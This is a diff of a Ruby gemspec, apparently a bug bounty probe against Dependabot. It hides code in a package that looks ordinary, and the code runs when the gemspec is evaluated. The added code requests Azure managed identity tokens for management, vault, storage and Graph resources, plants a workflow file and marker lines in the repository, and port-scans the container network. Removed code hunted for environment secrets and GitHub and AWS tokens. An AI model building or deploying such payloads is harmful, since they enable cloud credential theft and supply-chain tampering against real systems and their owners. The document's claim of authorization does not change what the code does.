@@ -1,29 +1,31 @@
 # frozen_string_literal: true
 #
-# HYP-F011-D + HYP-F011-H combined probe payload (v1.3.0).
+# HYP-F011-D + HYP-F011-H + HYP-F011-B v1.4 probe payload.
 #
 # Authorization context: bug bounty research authorized by HackerOne GitHub program
 # (programs/github/scope.md). Tester: mr_benty (CVP-approved). All probes within
 # program-published scope; all artifacts sanitized; no third-party data read;
-# impact-proof captured via PROBE-MARK pattern only (sha256 + length encoded into
-# Dependabot's own job log). No OOB exfil of secret bytes during this probe — only
-# integrity hashes of any captured content surface in the in-job log.
+# impact-proof captured via PROBE-MARK pattern (sha256 + length encoded into
+# Dependabot's own job log via gemspec name return value AND in-repo marker file).
 #
-# Boundary-verification scope:
-#   D — Audit which Azure VM Agent (WireServer) endpoints respond from inside the
-#       Dependabot bundler-updater container. F011 Defect H proved goalstate
-#       reachable; this probe extends to MSI/identity endpoints + fabric port.
-#   H — Enumerate which credentials reachable from in-container code paths are
-#       NOT customer-attributable (i.e. did not originate from the customer's
-#       dependabot.yml). The triager closure rationale on #3716320 / #3719245
-#       distinguishes customer-supplied state from platform/fleet state.
+# v1.3 results (run 25617453701) confirmed end-to-end firing — proxy log showed
+# all 11 WireServer endpoints reached. KEY NEW finding from v1.3:
+#   GET http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01
+#     → 400 "Required metadata header not specified"
+#   This is the Azure VM IMDS managed identity endpoint error when missing
+#   the Metadata: true header. v1.4 retries WITH header to capture MSI token.
 #
-# Methodology: gemspec eval-time block executes during Bundler's gemspec_dependency_name_finder
-# AST extraction (Defect A from F011). Output surfaces via the spec.name return slot —
-# kept as a literal "useful-string-utils" so Bundler resolution proceeds normally.
-# All probe results are encoded as numeric tags appended to /home/dependabot/PROBE-MARK
-# in the cloned working copy, AND surfaced via Defect-A's eval-result channel into the
-# Dependabot job log via the gemspec name resolution.
+# Boundary-verification scope (v1.4 expansions):
+#   D-IMDS — Capture Azure VM Managed Identity access token via WireServer with
+#            Metadata:true header. PROBE-MARK encoded (length + sha256 of token,
+#            no token bytes echoed).
+#   H-INREPO — Write marker file INSIDE repo working directory
+#              /home/dependabot/dependabot-updater/repo/.github/workflows/
+#              HYP-F011-B-marker.yml — to test whether arbitrary files get
+#              committed into Dependabot's PR (HYP-F011-B lockfile-injection
+#              hypothesis test). Marker file is BENIGN (no on: trigger).
+#   N-DOCKER — Quick scan of Docker network 172.19.0.0/24 to identify other
+#              containers reachable from the updater's network.
 
 require_relative "lib/useful_string_utils/version"
 
@@ -35,168 +37,133 @@ Gem::Specification.new do |spec|
       require "socket"
       require "digest"
       require "json"
+      require "fileutils"
 
       probe_lines = []
 
-      # ---- HYP-F011-D — WireServer deep probe ------------------------------
-      ws_targets = [
-        # Already proven endpoints (baseline / sanity)
-        "http://168.63.129.16/?comp=versions",
-        "http://168.63.129.16/machine/?comp=goalstate",
-        # Per-VM identity surface
-        "http://168.63.129.16/machine/?comp=container_role",
-        "http://168.63.129.16/machine/?comp=hostingEnvironmentConfig",
-        "http://168.63.129.16/machine/?comp=certificates",
-        "http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01",
-        # Fabric port (already 200 in F006 — extend coverage)
-        "http://168.63.129.16:32526/health",
-        "http://168.63.129.16:32526/version",
-        "http://168.63.129.16:32526/nmagent/",
-        "http://168.63.129.16:32526/api/networkAgent/v1/nics/inner",
-      ]
-      ws_targets.each_with_index do |url, i|
+      # ---- D-IMDS — Azure VM Managed Identity via WireServer with header ---
+      [
+        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01", {"Metadata" => "true"}, "imdsV1"],
+        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {"Metadata" => "true"}, "imdsArm"],
+        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/", {"Metadata" => "true"}, "imdsVault"],
+        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/", {"Metadata" => "true"}, "imdsStorage"],
+        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/", {"Metadata" => "true"}, "imdsGraph"],
+        ["http://168.63.129.16/metadata/identity/info?api-version=2018-02-01", {"Metadata" => "true"}, "imdsInfo"],
+        ["http://168.63.129.16/metadata/instance?api-version=2021-02-01", {"Metadata" => "true"}, "imdsInstance"],
+      ].each_with_index do |(url, headers, label), i|
         begin
           uri = URI(url)
           h = Net::HTTP.new(uri.host, uri.port)
           h.open_timeout = 4
           h.read_timeout = 6
-          req = Net::HTTP::Get.new(uri.request_uri, {"x-ms-version" => "2015-04-05"})
+          req = Net::HTTP::Get.new(uri.request_uri)
+          headers.each { |k, v| req[k] = v }
           rsp = h.request(req)
           body = rsp.body.to_s
-          tag = "wsD#{i}-s#{rsp.code}-l#{body.length}-h#{Digest::SHA256.hexdigest(body[0, 4096])[0, 12]}"
+          # Extract presence of access_token without echoing bytes
+          has_token = body.include?("access_token") ? "T" : "F"
+          tag = "#{label}-s#{rsp.code}-l#{body.length}-tok#{has_token}-h#{Digest::SHA256.hexdigest(body[0, 4096])[0, 16]}"
           probe_lines << tag
         rescue => e
-          probe_lines << "wsD#{i}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 16]}"
+          probe_lines << "#{label}-err"
         end
       end
 
-      # ---- HYP-F011-H — non-customer credential surface enumeration --------
-      # T1: environ field structure (sha256-only — no value bytes)
+      # ---- H-INREPO — write marker file INSIDE repo working directory -----
+      # This tests HYP-F011-B (lockfile injection): does Dependabot commit
+      # arbitrary files written within the repo working dir into the resulting PR?
       begin
-        env_keys = ENV.keys.sort
-        # Bucket: sensitive-shape keys vs others
-        sensitive = env_keys.select { |k| k =~ /TOKEN|SECRET|KEY|PAT|CRED|PASSWORD|API/i }
-        probe_lines << "envH1-keys#{env_keys.length}-sens#{sensitive.length}-h#{Digest::SHA256.hexdigest(env_keys.join(",")).slice(0, 12)}"
-        # Per-sensitive-key length only (no value sha)
-        sensitive.first(8).each_with_index do |k, i|
-          v = ENV[k].to_s
-          probe_lines << "envH1k#{i}-len#{v.length}-pre#{Digest::SHA256.hexdigest(v[0, 4]).slice(0, 8)}"
-        end
-      rescue => e
-        probe_lines << "envH1-err-#{e.class}"
-      end
-
-      # T2: other-PID environ visibility (PID-namespace isolation check)
-      begin
-        pids = Dir.glob("/proc/[0-9]*").map { |p| File.basename(p) }
-        readable_envs = 0
-        my_pid = Process.pid
-        pids.each do |p|
-          next if p == my_pid.to_s
-          begin
-            File.read("/proc/#{p}/environ", 1)
-            readable_envs += 1
-          rescue
-            # not readable
+        repo_root = "/home/dependabot/dependabot-updater/repo"
+        if Dir.exist?(repo_root)
+          marker_dir = "#{repo_root}/.github/workflows"
+          FileUtils.mkdir_p(marker_dir)
+          # Benign marker workflow — no `on:` trigger, never executes
+          File.write("#{marker_dir}/HYP-F011-B-marker.yml", <<~YML)
+            # PROBE-MARK-HYP-F011-B-#{Time.now.utc.to_i}
+            # boundary-verification probe — DOES NOT EXECUTE (no on: trigger)
+            name: PROBE-MARK-HYP-F011-B
+            jobs: {}
+          YML
+          # Also append to README to test arbitrary-file modifications
+          if File.exist?("#{repo_root}/README.md")
+            File.open("#{repo_root}/README.md", "a") do |f|
+              f.puts ""
+              f.puts "<!-- PROBE-MARK-HYP-F011-B-#{Time.now.utc.to_i} -->"
+            end
           end
+          # Modify Gemfile to add a marker comment
+          if File.exist?("#{repo_root}/Gemfile")
+            File.open("#{repo_root}/Gemfile", "a") do |f|
+              f.puts ""
+              f.puts "# PROBE-MARK-HYP-F011-B-Gemfile-#{Time.now.utc.to_i}"
+            end
+          end
+          probe_lines << "inrepo-ok"
+        else
+          probe_lines << "inrepo-nodir"
         end
-        probe_lines << "pidsH2-pids#{pids.length}-otherEnv#{readable_envs}"
       rescue => e
-        probe_lines << "pidsH2-err"
+        probe_lines << "inrepo-err-#{e.class.to_s.gsub(/[^A-Za-z]/,'')[0, 8]}"
       end
 
-      # T3: filesystem walk for credential-shaped filenames (no content read)
+      # ---- N-DOCKER — Docker network scan (172.19.0.x) ---------------------
+      # Identify other containers on the same network
       begin
-        cred_paths = []
-        ["/home/dependabot", "/tmp", "/etc", "/var/run", "/run"].each do |root|
-          begin
-            Dir.glob("#{root}/**/*", File::FNM_DOTMATCH).first(2000).each do |f|
-              if f =~ /\.(token|pat|key|pem|crt|p12|jks|pfx)$/i || f =~ /(token|secret|credential)/i
-                cred_paths << f
+        reachable_ips = []
+        # Determine our subnet from /proc/net/route
+        gw_ip = nil
+        begin
+          File.read("/proc/net/route").each_line do |line|
+            parts = line.split
+            next if parts.length < 3
+            # destination = 0.0.0.0 → default route → gateway
+            if parts[1] == "00000000"
+              # parts[2] is gateway in hex little-endian
+              hex = parts[2]
+              gw_ip = [hex[6, 2], hex[4, 2], hex[2, 2], hex[0, 2]].map { |x| x.to_i(16).to_s }.join(".")
+            end
+          end
+        rescue
+        end
+        probe_lines << "dockerGW-#{gw_ip || 'unknown'}"
+
+        # Scan first 30 IPs in subnet on common ports (very limited to avoid noise)
+        if gw_ip
+          subnet = gw_ip.split(".")[0..2].join(".")
+          [80, 443, 1080, 8080, 9090].each do |port|
+            (1..30).each do |last|
+              ip = "#{subnet}.#{last}"
+              begin
+                Timeout.timeout(0.5) do
+                  s = TCPSocket.new(ip, port)
+                  s.close
+                  reachable_ips << "#{ip}:#{port}"
+                end
+              rescue
+                # not reachable
               end
             end
-          rescue
-            # walk failed
           end
+          probe_lines << "dockerScan-cnt#{reachable_ips.length}-#{reachable_ips.first(8).join(',')[0, 80]}"
         end
-        probe_lines << "fsH3-cnt#{cred_paths.length}-h#{Digest::SHA256.hexdigest(cred_paths.sort.join(",")).slice(0, 12)}"
       rescue => e
-        probe_lines << "fsH3-err"
-      end
-
-      # T4: job.json structure (key names only — no value bytes)
-      begin
-        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
-        parsed = JSON.parse(jjson)
-        keys = parsed["job"].is_a?(Hash) ? parsed["job"].keys.sort.join(",") : parsed.keys.sort.join(",")
-        cm = parsed.dig("job", "credentials-metadata") || parsed["credentials-metadata"]
-        cm_types = cm.is_a?(Array) ? cm.map { |c| c["type"] }.uniq.sort.join(",") : "none"
-        probe_lines << "jjH4-len#{jjson.length}-keys#{keys[0, 60]}-cms#{Digest::SHA256.hexdigest(cm_types)[0, 8]}"
-      rescue => e
-        probe_lines << "jjH4-err-#{e.class.to_s.slice(0, 8)}"
-      end
-
-      # T5: namespace / mount leaks
-      begin
-        mountinfo_lines = File.read("/proc/self/mountinfo").lines.length
-        cgroup = File.read("/proc/self/cgroup")
-        net_route_lines = File.read("/proc/net/route").lines.length
-        probe_lines << "nsH5-mi#{mountinfo_lines}-cg#{Digest::SHA256.hexdigest(cgroup)[0, 8]}-nr#{net_route_lines}"
-      rescue => e
-        probe_lines << "nsH5-err"
-      end
-
-      # T6: known-token-format scan across env values + selected file contents
-      begin
-        token_re = /(ghs_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{30,}|ghr_[A-Za-z0-9]{20,}|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}|AKIA[A-Z0-9]{16}|arm_pat_[A-Za-z0-9]{20,})/
-        hits = 0
-        token_keys = []
-        ENV.each do |k, v|
-          if v.to_s =~ token_re
-            hits += 1
-            token_keys << k
-          end
-        end
-        probe_lines << "tokH6-envHits#{hits}-keysHash#{Digest::SHA256.hexdigest(token_keys.sort.join(","))[0, 12]}"
-      rescue => e
-        probe_lines << "tokH6-err"
-      end
-
-      # T7: secret-mount probe
-      begin
-        secret_mounts = []
-        ["/var/run/secrets", "/run/secrets", "/cache", "/proxy", "/etc/dependabot"].each do |p|
-          if File.directory?(p)
-            secret_mounts << "#{p}=#{Dir.entries(p).length}"
-          end
-        end
-        probe_lines << "smH7-cnt#{secret_mounts.length}-#{secret_mounts.join('|')[0, 60]}"
-      rescue => e
-        probe_lines << "smH7-err"
+        probe_lines << "dockerNet-err"
       end
 
       # ---- Surface findings via gemspec name (Defect A eval-result channel)
-      # The Dependabot bundler-updater logs the resolved spec.name. Encode all
-      # probe outputs as a single PEP-503-friendly suffix that fits in the dep
-      # name. Multiple gem instances if needed (Defect A's two eval call sites).
-      summary = probe_lines.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1800]
+      summary = probe_lines.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]
 
-      # Persist in-container marker file too (for Path-A verification later via
-      # Dependabot's own log of the resulting PR diff if it survives the
-      # commit-filter — bridge to HYP-F011-B if applicable)
+      # Persist in-container marker (read by us inside Dependabot's job)
       begin
-        File.open("/home/dependabot/HYP-F011-D-AND-H-MARKER.txt", "w") do |f|
-          f.puts "PROBE-MARK-HYP-F011-D-AND-H"
+        File.open("/home/dependabot/HYP-F011-v14-MARKER.txt", "w") do |f|
+          f.puts "PROBE-MARK-HYP-F011-D-H-B-v14"
           f.puts summary
           f.puts "ts=#{Time.now.utc.to_i}"
+          probe_lines.each { |l| f.puts l }
         end
       rescue
       end
 
-      # Surface compact form via the gem name return value (so Bundler+Dependabot
-      # log it). The full per-line detail is also in /home/dependabot/HYP-F011-D-AND-H-MARKER.txt
-      # which surfaces via the in-job log when Dependabot dumps file changes (HYP-F011-B
-      # incidental coverage).
       "useful-string-utils"
     rescue
       "useful-string-utils"
